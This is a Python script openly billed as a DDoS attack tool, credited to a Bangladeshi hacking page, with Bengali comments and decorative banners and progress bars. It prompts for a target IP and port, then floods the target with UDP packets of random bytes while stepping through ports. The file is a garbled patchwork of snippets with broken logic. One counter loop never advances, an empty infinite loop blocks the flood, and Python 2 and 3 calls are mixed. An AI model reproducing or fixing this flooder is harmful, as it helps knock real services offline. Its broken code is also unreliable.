import sys
import os
import time
import socket                          
import random
                                                  

ired="\033[0;91m"         # Red
igreen="\033[0;92m"       # Green
iblue="\033[0;94m"        # Blue

os.system("clear")



print("""\033[38;2;255;0;0m
██╗  ██╗ █████╗  ██████╗ ██╗  ██╗███████╗██████╗
\033[38;2;255;80;0m██║  ██║██╔══██╗██╔════╝ ██║ ██╔╝██╔════╝██╔══██╗
\033[38;2;255;150;0m███████║███████║██║  ███╗█████╔╝ █████╗  ██████╔╝
\033[38;2;255;220;0m██╔══██║██╔══██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
\033[38;2;0;200;255m██║  ██║██║  ██║╚██████╔╝██║  ██╗███████╗██║  ██║
\033[38;2;0;120;255m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

\033[38;2;180;0;255m╔═══════════════════════════════════════════════╗
\033[38;2;255;0;200m                   ★  D-DOS ATTACK  ★
\033[38;2;255;0;120m          “Access Granted —→ System Online”
\033[38;2;180;0;255m╚═══════════════════════════════════════════════╝

\033[38;2;0;255;180mUnleashing the synthetic D-DoS tempest… stand by.\033[0m""")

ip = input("Target ip : ")
port = input("Port       : ")

os.system("clear")

import os
import time
import sys

def rgb(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

banner = r"""
    ____        ____  ____  _____
   / __ \      / __ \/ __ \/ ___/
  / / / /_____/ / / / / / /\__ \ 
 / /_/ /_____/ /_/ / /_/ /___/ / 
/_____/     /_____/\____//____/  
"""

# টার্মিনাল পরিষ্কার করে কার্সর লুকানো
os.system("clear")
print("\033[?25l")   # hide cursor

start = time.time()

while time.time() - start < 10:
    for i in range(0, 255):
        if time.time() - start >= 10:
            break

        # clear না করে শুধু কার্সর টপে পাঠানো
        print("\033[H", end="")

        print(rgb(i, 255 - i, (i * 2) % 255, banner))
        time.sleep(0.01)

# শেষে কার্সর দেখানো + স্ক্রিন পরিষ্কার
print("\033[?25h")
os.system("clear")

import sys
import time
import math

def hsv_to_rgb(h, s, v):
    """h in [0,1], s in [0,1], v in [0,1] -> r,g,b 0-255"""
    i = int(h * 6)
    f = (h * 6) - i
    p = v * (1 - s)
    q = v * (1 - f * s)
    t = v * (1 - (1 - f) * s)
    i %= 6
    if i == 0:
        r, g, b = v, t, p
    elif i == 1:
        r, g, b = q, v, p
    elif i == 2:
        r, g, b = p, v, t
    elif i == 3:
        r, g, b = p, q, v
    elif i == 4:
        r, g, b = t, p, v
    else:
        r, g, b = v, p, q
    return int(r * 255), int(g * 255), int(b * 255)

def rgb_escape(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

def rgb_bg_escape(r, g, b, text):
    return f"\033[48;2;{r};{g};{b}m{text}\033[0m"

def progress_bar(percent, width=40):
    filled = int(width * percent / 100)
    empty = width - filled
    # pick a hue that moves across spectrum as percent increases
    hue = (percent / 100.0)  # 0.0 - 1.0
    r, g, b = hsv_to_rgb(hue, 1.0, 1.0)
    # use colored blocks for filled part (background color) and dim for empty
    filled_block = rgb_bg_escape(r, g, b, " " * filled)
    empty_block = "\033[48;2;50;50;50m" + " " * empty + "\033[0m"
    percent_text = rgb_escape(255 - r, 255 - g, 255 - b, f" {percent:3d}% ")
    return f"{filled_block}{empty_block}{percent_text}"

def run_loading(total_seconds=5):
    interval = total_seconds / 100.0  # seconds per 1%
    # hide cursor
    sys.stdout.write("\033[?25l")
    try:
        for p in range(1, 101):
            bar = progress_bar(p, width=40)
            # write with carriage return to overwrite same line
            sys.stdout.write("\r" + bar)
            sys.stdout.flush()
            time.sleep(interval)
        # final newline and keep last state for a moment
        sys.stdout.write("\n")
    finally:
        # show cursor again
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()

if __name__ == "__main__":
    run_loading(5)  # run 120 seconds total

i = 1

while i<=500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000:
        if i%1 == 0:
                print(str(i)+str(ired+''' Start send  Package '''))
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print
print("Author   : Piyas Akhondo")
print("page : Bangladesh Hacking Help Centre")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(3)
print("[==========          ] 50%")
time.sleep(4)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:

     sent = 0   # কাউন্টার শুরু

while True:
    sent += 1   # প্রতি লুপে ১ করে বাড়বে

    # রিকুয়েস্ট পাঠানো
    sock.sendto(bytes, (ip, port))

    # কাউন্টার দেখানো (একই লাইনে আপডেট হবে)
    print(f"\rSent packets: {sent}", end="")
    
    # পোর্ট বাড়ানো
    port += 1
if port == 1000000000:
    port = 1